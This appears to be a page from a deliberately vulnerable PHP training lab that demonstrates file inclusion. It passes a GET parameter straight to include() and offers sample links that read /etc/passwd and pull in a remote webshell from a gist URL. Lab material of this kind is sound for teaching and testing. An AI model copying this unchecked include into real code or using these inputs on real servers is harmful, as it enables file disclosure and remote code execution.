<?php
defined('APP') or die('Access denied');
?>
<h3>File Inclusion</h3>
<a href="?page=file-inclusion&file=outra-pagina.php">Página PHP</a><br />
<a href="?page=file-inclusion&file=/etc/passwd">/etc/passwd</a><br />
<a href="?page=file-inclusion&file=https://www.google.com.br">Google</a><br />
<a href="?page=file-inclusion&file=https://gist.githubusercontent.com/taeguk/d5d9e4a10dfb4295e00b/raw/b4367494ff69d7ab79bb48391464298e2d7186df/webshell.php">Webshell</a><br />
<hr />
<?php
if (isset($_GET['file'])) {
    $file = $_GET['file'];
    include($file);
}
?>